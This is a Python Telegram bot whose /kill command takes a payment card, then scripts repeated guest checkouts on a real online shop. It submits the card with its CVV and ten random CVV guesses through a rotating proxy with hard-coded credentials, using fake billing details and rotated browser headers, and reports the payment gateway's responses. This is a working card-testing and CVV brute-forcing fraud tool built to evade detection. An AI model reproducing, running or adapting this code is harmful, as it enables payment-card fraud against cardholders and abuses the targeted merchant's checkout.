import os
import re
import random
import string
import time
import logging
from telethon import TelegramClient, events
from telethon.tl.types import InputPeerChat
import requests as r
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Bot configuration
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# Initialize Telegram client
client = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Proxy configuration
proxies = {
    "http": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/",
    "https": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/"
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def generate_random_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(domains)
    return f"{name}@{domain}"

def get_headers():
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Connection': 'keep-alive',
        'Referer': 'https://www.patchstop.com/mens-and-womens-clothing/womens-fashion-tops.html',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': get_random_user_agent(),
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

def get_form_key_and_action():
    try:
        s = r.Session()
        headers = get_headers()
        response = s.get(
            'https://www.patchstop.com/motorcycle-rally-products/daytona-beach-bike-week/daytona-bike-week-2021/2021-daytona-bike-week-80-years-flaming-pipes-event-patch.html',
            headers=headers,
            proxies=proxies,
            timeout=15
        )
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', id='product_addtocart_form')
        action_url = form['action']
        form_key_match = re.search(r'/form_key/([^/]+)/', action_url)
        form_key = form_key_match.group(1) if form_key_match else None
        logger.info("Successfully fetched form key and action URL")
        return s, form_key, action_url
    except Exception as e:
        logger.error(f"Form key fetch failed: {e}")
        return None, None, None

async def process_cvv_single(card_info, cvv, event):
    cc, mm, yy, _ = card_info.split('|')
    email = generate_random_email()
    headers = get_headers()
    session, form_key, action_url = get_form_key_and_action()
    
    if not session or not form_key or not action_url:
        await event.respond(f"{cvv} - Failed to get form key")
        logger.warning(f"Failed to get form key for CVV: {cvv}")
        return f"{cvv} - Failed to get form key"

    try:
        # Add to cart
        data = {
            'form_key': form_key,
            'product': '20164',
            'related_product': '',
            'qty': '1'
        }
        session.post(action_url, headers=headers, data=data, proxies=proxies, timeout=15)
        logger.info(f"Added product to cart for CVV: {cvv}")

        # Go to checkout
        session.get('https://www.patchstop.com/checkout/onepage/', headers=headers, proxies=proxies, timeout=15)

        # Save checkout method
        session.post('https://www.patchstop.com/checkout/onepage/saveMethod/', headers=headers, data={'method': 'guest'}, proxies=proxies, timeout=15)

        # Save billing info
        billing = {
            'billing[address_id]': '',
            'billing[firstname]': 'Mohammed',
            'billing[lastname]': 'Nehal',
            'billing[company]': '',
            'billing[email]': email,
            'billing[street][]': ['New York', 'New York'],
            'billing[city]': 'New York',
            'billing[region_id]': '43',
            'billing[postcode]': '10040',
            'billing[country_id]': 'US',
            'billing[telephone]': '07975102052',
            'billing[save_in_address_book]': '1',
            'billing[use_for_shipping]': '1',
            'form_key': form_key,
        }
        session.post('https://www.patchstop.com/checkout/onepage/saveBilling/', headers=headers, data=billing, proxies=proxies, timeout=15)
        logger.info(f"Saved billing info for CVV: {cvv}")

        # Save shipping method
        session.post('https://www.patchstop.com/checkout/onepage/saveShippingMethod/', headers=headers, data={'shipping_method': 'usps_1', 'form_key': form_key}, proxies=proxies, timeout=15)

        # Submit payment and place order
        data = {
            'payment[method]': 'authorizenet',
            'payment[cc_type]': 'VI',
            'payment[cc_number]': cc,
            'payment[cc_exp_month]': mm,
            'payment[cc_exp_year]': yy,
            'payment[cc_cid]': cvv,
            'form_key': form_key,
        }
        resp = session.post(f'https://www.patchstop.com/checkout/onepage/saveOrder/form_key/{form_key}/', headers=headers, data=data, proxies=proxies, timeout=15)

        try:
            msg = resp.json().get('error_messages', 'No error message found')
            await event.respond(f"{cvv} - {msg}")
            logger.info(f"Processed CVV {cvv}: {msg}")
            return f"{cvv} - {msg}"
        except:
            await event.respond(f"{cvv} - Response parse failed")
            logger.error(f"Response parse failed for CVV: {cvv}")
            return f"{cvv} - Response parse failed"

    except Exception as e:
        await event.respond(f"{cvv} - Exception: {str(e)}")
        logger.error(f"Exception for CVV {cvv}: {str(e)}")
        return f"{cvv} - Exception: {str(e)}"

async def process_card(card_info, event):
    start_time = time.time()
    logger.info(f"Starting card processing: {card_info}")

    try:
        _, _, _, real_cvv = card_info.split('|')
        cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(10)]
    except ValueError:
        await event.respond("Invalid card format. Use: cc|mm|yy|cvv")
        logger.error(f"Invalid card format: {card_info}")
        return

    with ThreadPoolExecutor(max_workers=8) as executor:
        results = await client.loop.run_in_executor(
            None,
            lambda: list(executor.map(lambda c: client.loop.run_until_complete(process_cvv_single(card_info, c, event)), cvvs))
        )

    end_time = time.time()
    total_time = end_time - start_time
    await event.respond(f"✅ Total time taken: {total_time:.2f} seconds")
    logger.info(f"Card processing completed in {total_time:.2f} seconds")

@client.on(events.NewMessage(pattern='/kill (.+)'))
async def handle_kill(event):
    card_info = event.pattern_match.group(1).strip()
    logger.info(f"Received /kill command with card: {card_info}")
    await event.respond("Processing card...")
    await process_card(card_info, event)

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond("Bot started! Use /kill cc|mm|yy|cvv to process a card.")
    logger.info("Bot started by user")

async def main():
    logger.info("Bot is running...")
    await client.run_until_disconnected()

if __name__ == '__main__':
    client.loop.run_until_complete(main())
